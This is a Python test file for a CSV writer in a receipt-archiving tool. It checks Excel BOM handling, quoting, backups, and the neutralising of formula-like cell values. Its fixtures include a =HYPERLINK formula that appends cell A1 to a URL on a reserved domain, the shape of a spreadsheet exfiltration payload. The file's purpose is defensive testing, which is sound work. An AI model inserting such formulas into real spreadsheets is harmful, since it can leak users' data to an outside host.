"""CSV writing: BOM for Excel, quoting, append, rewrite with backup, and text
like a formula held quoted and read back as it was written."""
import sys
from pathlib import Path


from paperpull_core.storage import CsvFile

# Column sets are per-provider; CsvFile's mechanics are not, so these
# tests use representative lists of their own.
ORDER_HISTORY_COLUMNS = [
    "Account Holder", "Purchase Date", "Purchase Type",
    "Order or Receipt Number", "Item Name", "Unit Price", "Order Total",
    "Purchase Summary", "PDF Filename", "Processing Status", "Notes",
]
RECEIPT_INDEX_COLUMNS = [
    "Account Holder", "Purchase Date", "Purchase Type",
    "Order or Receipt Number", "Order Total", "Purchase Summary",
    "PDF Filename", "PDF Full Path", "Receipt Status", "Processing Status",
    "Notes",
]


def test_header_and_bom(tmp_path):
    f = CsvFile(tmp_path / "t.csv", ORDER_HISTORY_COLUMNS)
    f.append_rows([{"Purchase Date": "2024-01-01", "Purchase Type": "Online"}])
    raw = (tmp_path / "t.csv").read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")  # UTF-8 BOM for Excel
    text = raw.decode("utf-8-sig")
    assert text.splitlines()[0].split(",")[0] == "Account Holder"


def test_quoting_of_commas_and_quotes(tmp_path):
    f = CsvFile(tmp_path / "t.csv", ORDER_HISTORY_COLUMNS)
    f.append_rows([{"Item Name": 'Widget, 12" deluxe, "special"', "Notes": "a,b"}])
    rows = f.read_all()
    assert rows[0]["Item Name"] == 'Widget, 12" deluxe, "special"'
    assert rows[0]["Notes"] == "a,b"


def test_append_preserves_existing(tmp_path):
    f = CsvFile(tmp_path / "t.csv", RECEIPT_INDEX_COLUMNS)
    f.append_rows([{"Order or Receipt Number": "1"}])
    f.append_rows([{"Order or Receipt Number": "2"}])
    rows = f.read_all()
    assert [r["Order or Receipt Number"] for r in rows] == ["1", "2"]


def test_missing_columns_blank_not_invented(tmp_path):
    f = CsvFile(tmp_path / "t.csv", ORDER_HISTORY_COLUMNS)
    f.append_rows([{"Purchase Date": "2024-01-01"}])
    row = f.read_all()[0]
    assert row["Unit Price"] == ""
    assert row["Order Total"] == ""


def test_rewrite_backs_up_and_replaces(tmp_path):
    backups = tmp_path / "Backups"
    f = CsvFile(tmp_path / "t.csv", RECEIPT_INDEX_COLUMNS, backups)
    f.append_rows([{"Order or Receipt Number": "1", "Purchase Summary": "Old"}])
    rows = f.read_all()
    rows[0]["Purchase Summary"] = "New"
    f.rewrite(rows)
    assert f.read_all()[0]["Purchase Summary"] == "New"
    assert list(backups.glob("t.*.bak"))
    # BOM survives rewrite
    assert (tmp_path / "t.csv").read_bytes().startswith(b"\xef\xbb\xbf")


def test_unicode_roundtrip(tmp_path):
    f = CsvFile(tmp_path / "t.csv", ORDER_HISTORY_COLUMNS)
    f.append_rows([{"Item Name": "Café Crème – 12oz ☕"}])
    assert f.read_all()[0]["Item Name"] == "Café Crème – 12oz ☕"


# -- text that looks like a formula ------------------------------------------------------

# A seller names an item, a store names itself, a statement names a
# document, and a file is named from those. Each value here is shaped like
# a formula and is harmless arithmetic or an address on a reserved domain.
SELLER = '=HYPERLINK("https://example.invalid/?"&A1,"Open")'
ADVERSARIAL = {
    "Account Holder": "@SUM(1,1)",
    "Purchase Date": "-1+1",
    "Purchase Type": "+1+1",
    "Order or Receipt Number": "=1+1",
    "Item Name": SELLER,
    "Unit Price": "-$12.34",
    "Order Total": "-$1,234.56",
    "Purchase Summary": "Widget; @SUM(1,1)\r\n=2+2",
    "PDF Filename": "=3+3; @SUM(1,1) Receipt.pdf",
    "Processing Status": "'=1+1",
    "Notes": "'Tis the season; O'Brien",
}


def _raw_rows(path):
    """The file as Excel would split it into cells, before any reading back."""
    import csv
    with open(path, encoding="utf-8-sig", newline="") as fh:
        rows = list(csv.reader(fh))
    return rows[0], rows[1:]


def _nothing_live(path):
    sys.path.insert(0, str(Path(__file__).resolve().parent))
    from test_sheets import live_anywhere
    _header, rows = _raw_rows(path)
    for row in rows:
        for cell in row:
            assert not live_anywhere(cell), repr(cell)


def test_text_like_a_formula_is_held_quoted_and_reads_back_as_written(tmp_path):
    f = CsvFile(tmp_path / "t.csv", ORDER_HISTORY_COLUMNS)
    f.append_rows([ADVERSARIAL])
    assert f.read_all() == [{c: ADVERSARIAL.get(c, "") for c in ORDER_HISTORY_COLUMNS}]
    header, (row,) = _raw_rows(tmp_path / "t.csv")
    held = dict(zip(header, row))
    assert held["Item Name"] == "'" + SELLER
    assert held["Order or Receipt Number"] == "'=1+1"
    assert held["Purchase Date"] == "'-1+1" and held["Purchase Type"] == "'+1+1"
    assert held["Purchase Summary"] == "Widget;' @SUM(1,1)\r\n'=2+2"
    assert held["PDF Filename"] == "'=3+3;' @SUM(1,1) Receipt.pdf"
    # A refund's amounts are left as they were, so Excel still sums them.
    assert (held["Unit Price"], held["Order Total"]) == ("-$12.34", "-$1,234.56")
    # A real name starting with a quote and then = takes one more, and one
    # starting with a quote and then words is left as it is.
    assert held["Processing Status"] == "''=1+1"
    assert held["Notes"] == "'Tis the season; O'Brien"
    _nothing_live(tmp_path / "t.csv")


def test_reading_and_rewriting_again_and_again_never_adds_a_quote(tmp_path):
    """Verify, Rename and reparse read every row and write them all back,
    so a quote that did not come off would gain one more each time."""
    f = CsvFile(tmp_path / "t.csv", ORDER_HISTORY_COLUMNS, tmp_path / "Backups")
    f.append_rows([ADVERSARIAL])
    first = (tmp_path / "t.csv").read_bytes()
    for _ in range(3):
        f.rewrite(f.read_all())
    assert (tmp_path / "t.csv").read_bytes() == first
    assert f.read_all()[0]["Item Name"] == SELLER


def test_a_file_written_before_the_rule_reads_as_it_did_and_takes_new_rows(tmp_path):
    """An older version wrote the same text as it was. It reads back the
    same, a row added now is held quoted beside it, and the first rewrite
    quotes the old row too."""
    import csv
    path = tmp_path / "t.csv"
    old = {c: ADVERSARIAL[c] for c in ORDER_HISTORY_COLUMNS
           if c in ADVERSARIAL and c != "Processing Status"}
    with open(path, "w", encoding="utf-8-sig", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=ORDER_HISTORY_COLUMNS)
        w.writeheader()
        w.writerow(old)
    f = CsvFile(path, ORDER_HISTORY_COLUMNS, tmp_path / "Backups")
    as_old = {c: old.get(c, "") for c in ORDER_HISTORY_COLUMNS}
    assert f.read_all() == [as_old]
    f.append_rows([dict(old, **{"Order or Receipt Number": "@2"})])
    assert f.read_all() == [as_old, dict(as_old, **{"Order or Receipt Number": "@2"})]
    _header, rows = _raw_rows(path)
    assert rows[0][ORDER_HISTORY_COLUMNS.index("Item Name")] == SELLER
    assert rows[1][ORDER_HISTORY_COLUMNS.index("Item Name")] == "'" + SELLER
    f.rewrite(f.read_all())
    assert f.read_all() == [as_old, dict(as_old, **{"Order or Receipt Number": "@2"})]
    _nothing_live(path)


def test_a_value_that_is_not_text_is_written_as_its_text(tmp_path):
    f = CsvFile(tmp_path / "t.csv", RECEIPT_INDEX_COLUMNS)
    f.append_rows([{"Order or Receipt Number": -42, "Order Total": -12.5, "Notes": None,
                    "Receipt Status": True}])
    row = f.read_all()[0]
    assert (row["Order or Receipt Number"], row["Order Total"], row["Notes"],
            row["Receipt Status"]) == ("-42", "-12.5", "", "True")
